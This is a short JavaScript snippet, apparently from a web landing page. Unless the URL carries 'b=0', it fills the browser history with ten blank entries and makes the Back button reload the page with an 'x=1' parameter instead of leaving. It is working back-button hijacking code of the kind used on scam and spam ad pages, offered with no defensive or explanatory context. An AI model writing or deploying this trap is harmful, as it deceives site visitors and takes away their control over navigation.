var PreventBb = false;
getUrlParameter("b") === "0" ? PreventBb = true : PreventBb = false;

!function () {
    if (!PreventBb) {
        var t;
        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
            onpopstate = function (t) {
                t.state && location.replace(getUrlWithParam("x=1"))
            }
        } catch (o) {

        }
    }
}();

function getUrlParameter(name) {
	name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
	var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
		results = regex.exec(location.search);
	return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function getUrlWithParam(param) {
    var url = window.location.href;

    if (url.includes("x=")) {
        url = url.replace(/(x=)[0-9]{1,2}/, param)
    }
    else {
        url = url + "&" + param;
    }

    return url;
}